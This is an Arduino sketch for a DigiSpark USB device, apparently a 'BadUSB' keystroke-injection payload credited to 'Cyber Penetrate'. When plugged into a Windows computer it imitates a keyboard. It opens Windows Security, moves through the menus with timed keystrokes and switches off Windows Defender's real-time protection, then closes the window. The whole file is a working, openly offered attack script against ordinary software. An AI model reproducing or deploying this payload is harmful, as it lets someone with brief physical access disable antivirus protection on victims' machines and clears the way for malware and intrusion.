/*
 * Disable Windows Defender
 * It turns off the Windows Defender.
 * Author - Cyber Penetrate
*/
#include<DigiKeyboard.h>
void setup()
{
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_S,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("windows security");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (int i=0;i<=4;i++)
  {
    DigiKeyboard.sendKeyStroke(43);
    DigiKeyboard.delay(500);
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(44);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
}
void loop()
{
  //Nothing to do here :)
}
